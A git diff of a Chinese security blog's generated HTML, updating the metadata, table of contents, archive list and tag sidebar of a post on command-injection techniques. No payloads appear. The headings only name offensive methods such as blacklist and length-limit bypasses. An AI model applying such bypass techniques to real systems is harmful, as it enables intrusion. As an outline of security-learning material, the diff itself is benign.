             <p>原文链接：<a href="https://hackerqwq.github.io/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/">https://hackerqwq.github.io/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/</a>
             <p>发表日期：<a href="https://hackerqwq.github.io/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/">August 7th 2020, 3:48:17 pm</a>
-            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/">September 27th 2021, 9:53:09 pm</a>
+            <p>更新日期：<a href="https://hackerqwq.github.io/2020/08/07/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%9F%A5%E8%AF%86%E7%82%B9%E6%95%B4%E7%90%86%EF%BC%88%E6%9B%B4%E6%96%B0-%EF%BC%89/">November 8th 2021, 6:13:51 pm</a>
             <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -700,7 +768,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">PHP危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">命令执行常见执行方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7"><span class="toc-number">2.</span> <span class="toc-text">无回显技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">常见绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.1.</span> <span class="toc-text">单引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.2.</span> <span class="toc-text">双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.3.</span> <span class="toc-text">用反斜杠和斜杠绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.4.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.5.</span> <span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.6.</span> <span class="toc-text">base64绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.7.</span> <span class="toc-text">其他绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">长度限制绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.</span> <span class="toc-text">反斜杠和斜杠绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-number">4.</span> <span class="toc-text">常用符号</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">通配符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">防止命令执行漏洞</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.1.</span> <span class="toc-text">PHP危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%B8%B8%E8%A7%81%E6%89%A7%E8%A1%8C%E6%96%B9%E5%BC%8F"><span class="toc-number">1.2.</span> <span class="toc-text">命令执行常见执行方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E5%9B%9E%E6%98%BE%E6%8A%80%E5%B7%A7"><span class="toc-number">2.</span> <span class="toc-text">无回显技巧</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">常见绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%91%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">黑名单绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.1.</span> <span class="toc-text">单引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.2.</span> <span class="toc-text">双引号绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.3.</span> <span class="toc-text">用反斜杠和斜杠绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.4.</span> <span class="toc-text">通配符绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.5.</span> <span class="toc-text">十六进制绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.6.</span> <span class="toc-text">base64绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shell%E8%A7%A3%E6%9E%90%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.7.</span> <span class="toc-text">shell解析绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">3.3.</span> <span class="toc-text">长度限制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#15%E4%B8%AA%E5%8F%AF%E6%8E%A7%E5%AD%97%E7%AC%A6%E4%B8%8B%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.1.</span> <span class="toc-text">15个可控字符下的命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7%E4%B8%AA%E5%AD%97%E7%AC%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.2.</span> <span class="toc-text">7个字符的命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5%E4%BD%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.3.</span> <span class="toc-text">5位字符的命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4%E4%BD%8D%E5%8F%AF%E6%8E%A7%E5%AD%97%E7%AC%A6%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.4.</span> <span class="toc-text">4位可控字符的命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E4%BD%8D%E5%AD%97%E7%AC%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">3.3.5.</span> <span class="toc-text">3位字符命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%BB%95%E8%BF%87"><span class="toc-number">3.4.</span> <span class="toc-text">其他绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E6%96%9C%E6%9D%A0%E5%92%8C%E6%96%9C%E6%9D%A0%E7%BB%95%E8%BF%87"><span class="toc-number">3.5.</span> <span class="toc-text">反斜杠和斜杠绕过</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%AC%A6%E5%8F%B7"><span class="toc-number">4.</span> <span class="toc-text">常用符号</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-number">4.1.</span> <span class="toc-text">命令分隔符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-number">4.2.</span> <span class="toc-text">通配符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E6%AD%A2%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">5.</span> <span class="toc-text">防止命令执行漏洞</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -2747,9 +2815,133 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 124
+        Total : 130
         </div>
         <!-- search  -->
         
@@ -2769,7 +2961,37 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb漏洞学习(sql注入)</a>
+            <span class="archive-post-date">11/09</span><a class="archive-post-title" href= "/2021/11/09/open-basedir%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/" >open_basedir方法总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2021/11/06/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-xss/" >javaweb代码审计学习(xss)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/php%E5%87%A0%E9%81%93%E9%9A%8F%E6%9C%BA%E6%95%B0%E9%A2%98%E5%B0%8F%E6%80%BB%E7%BB%93/" >php几道随机数题小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/%E5%BC%BA%E7%BD%91%E6%9D%AF%E6%8B%9F%E6%80%81easy-filter%E8%A7%A3%E6%9E%90/" >强网杯拟态easy filter解析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span><a class="archive-post-title" href= "/2021/11/05/vscode%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95php%E5%BA%95%E5%B1%82%E4%BB%A3%E7%A0%81/" >vscode远程调试php底层代码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/02</span><a class="archive-post-title" href= "/2021/11/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%B0%8F%E6%80%BB%E7%BB%93/" >文件包含漏洞小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2021/11/01/javaweb%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-sql%E6%B3%A8%E5%85%A5/" >javaweb代码审计学习(sql注入)</a>
         </li>
     
     
@@ -3405,19 +3627,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="sql"><span class="iconfont-archer">&#xe606;</span>sql</span>
     
-        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
-    
         <span class="sidebar-tag-name" data-tags="jwt"><span class="iconfont-archer">&#xe606;</span>jwt</span>
     
-        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
-    
-        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
-    
-        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
-    
-        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
-    
-        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
+        <span class="sidebar-tag-name" data-tags="PHP反序列化"><span class="iconfont-archer">&#xe606;</span>PHP反序列化</span>
     
         <span class="sidebar-tag-name" data-tags="2020CISCN"><span class="iconfont-archer">&#xe606;</span>2020CISCN</span>
     
@@ -3433,25 +3645,35 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="Android"><span class="iconfont-archer">&#xe606;</span>Android</span>
     
-        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+        <span class="sidebar-tag-name" data-tags="2021红明谷"><span class="iconfont-archer">&#xe606;</span>2021红明谷</span>
     
-        <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+        <span class="sidebar-tag-name" data-tags="输入法取证"><span class="iconfont-archer">&#xe606;</span>输入法取证</span>
+    
+        <span class="sidebar-tag-name" data-tags="盲水印隐写"><span class="iconfont-archer">&#xe606;</span>盲水印隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="哈夫曼编码"><span class="iconfont-archer">&#xe606;</span>哈夫曼编码</span>
+    
+        <span class="sidebar-tag-name" data-tags="流量分析"><span class="iconfont-archer">&#xe606;</span>流量分析</span>
     
         <span class="sidebar-tag-name" data-tags="md5"><span class="iconfont-archer">&#xe606;</span>md5</span>
     
         <span class="sidebar-tag-name" data-tags="shtml"><span class="iconfont-archer">&#xe606;</span>shtml</span>
     
+        <span class="sidebar-tag-name" data-tags="png结构"><span class="iconfont-archer">&#xe606;</span>png结构</span>
+    
+        <span class="sidebar-tag-name" data-tags="CRC32"><span class="iconfont-archer">&#xe606;</span>CRC32</span>
+    
+        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
+    
         <span class="sidebar-tag-name" data-tags="Crypto"><span class="iconfont-archer">&#xe606;</span>Crypto</span>
     
         <span class="sidebar-tag-name" data-tags="CVE"><span class="iconfont-archer">&#xe606;</span>CVE</span>
     
-        <span class="sidebar-tag-name" data-tags="intro"><span class="iconfont-archer">&#xe606;</span>intro</span>
-    
         <span class="sidebar-tag-name" data-tags="Hash"><span class="iconfont-archer">&#xe606;</span>Hash</span>
     
-        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
-    
         <span class="sidebar-tag-name" data-tags="hash长度拓展攻击"><span class="iconfont-archer">&#xe606;</span>hash长度拓展攻击</span>
+    
+        <span class="sidebar-tag-name" data-tags="php_upload_progress_session"><span class="iconfont-archer">&#xe606;</span>php_upload_progress_session</span>
     
         <span class="sidebar-tag-name" data-tags="Java安全"><span class="iconfont-archer">&#xe606;</span>Java安全</span>
     
@@ -3487,15 +3709,15 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
-        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
-    
         <span class="sidebar-tag-name" data-tags="XML"><span class="iconfont-archer">&#xe606;</span>XML</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞"><span class="iconfont-archer">&#xe606;</span>漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
+        <span class="sidebar-tag-name" data-tags="JAJA"><span class="iconfont-archer">&#xe606;</span>JAJA</span>
     
         <span class="sidebar-tag-name" data-tags="XSS"><span class="iconfont-archer">&#xe606;</span>XSS</span>
+    
+        <span class="sidebar-tag-name" data-tags="XXE"><span class="iconfont-archer">&#xe606;</span>XXE</span>
     
         <span class="sidebar-tag-name" data-tags="编码漏洞"><span class="iconfont-archer">&#xe606;</span>编码漏洞</span>
     
@@ -3509,11 +3731,13 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="横向移动"><span class="iconfont-archer">&#xe606;</span>横向移动</span>
     
+        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+    
         <span class="sidebar-tag-name" data-tags="metasploit"><span class="iconfont-archer">&#xe606;</span>metasploit</span>
     
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
-        <span class="sidebar-tag-name" data-tags="漏洞利用"><span class="iconfont-archer">&#xe606;</span>漏洞利用</span>
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
     
         <span class="sidebar-tag-name" data-tags="PHP伪协议"><span class="iconfont-archer">&#xe606;</span>PHP伪协议</span>
     
@@ -3521,35 +3745,35 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="pickle"><span class="iconfont-archer">&#xe606;</span>pickle</span>
     
-        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="逻辑漏洞"><span class="iconfont-archer">&#xe606;</span>逻辑漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="2019CISCN"><span class="iconfont-archer">&#xe606;</span>2019CISCN</span>
     
-        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
-    
         <span class="sidebar-tag-name" data-tags="python"><span class="iconfont-archer">&#xe606;</span>python</span>
     
-        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+        <span class="sidebar-tag-name" data-tags="多线程"><span class="iconfont-archer">&#xe606;</span>多线程</span>
     
         <span class="sidebar-tag-name" data-tags="misc图像处理"><span class="iconfont-archer">&#xe606;</span>misc图像处理</span>
     
+        <span class="sidebar-tag-name" data-tags="redis攻防"><span class="iconfont-archer">&#xe606;</span>redis攻防</span>
+    
         <span class="sidebar-tag-name" data-tags="提权"><span class="iconfont-archer">&#xe606;</span>提权</span>
+    
+        <span class="sidebar-tag-name" data-tags="C"><span class="iconfont-archer">&#xe606;</span>C</span>
     
         <span class="sidebar-tag-name" data-tags="代码执行"><span class="iconfont-archer">&#xe606;</span>代码执行</span>
     
         <span class="sidebar-tag-name" data-tags="渗透"><span class="iconfont-archer">&#xe606;</span>渗透</span>
     
-        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
-    
         <span class="sidebar-tag-name" data-tags="phar反序列化"><span class="iconfont-archer">&#xe606;</span>phar反序列化</span>
+    
+        <span class="sidebar-tag-name" data-tags="bugs"><span class="iconfont-archer">&#xe606;</span>bugs</span>
     
         <span class="sidebar-tag-name" data-tags="变量覆盖漏洞"><span class="iconfont-archer">&#xe606;</span>变量覆盖漏洞</span>
     
-        <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
-    
         <span class="sidebar-tag-name" data-tags="扫描软件"><span class="iconfont-archer">&#xe606;</span>扫描软件</span>
+    
+        <span class="sidebar-tag-name" data-tags="弱类型比较"><span class="iconfont-archer">&#xe606;</span>弱类型比较</span>
     
         <span class="sidebar-tag-name" data-tags="Django"><span class="iconfont-archer">&#xe606;</span>Django</span>
     
@@ -3560,6 +3784,8 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="文件上传漏洞"><span class="iconfont-archer">&#xe606;</span>文件上传漏洞</span>
     
         <span class="sidebar-tag-name" data-tags="文件读取漏洞"><span class="iconfont-archer">&#xe606;</span>文件读取漏洞</span>
+    
+        <span class="sidebar-tag-name" data-tags="文件包含"><span class="iconfont-archer">&#xe606;</span>文件包含</span>
     
         <span class="sidebar-tag-name" data-tags="无参数构造payload"><span class="iconfont-archer">&#xe606;</span>无参数构造payload</span>
     
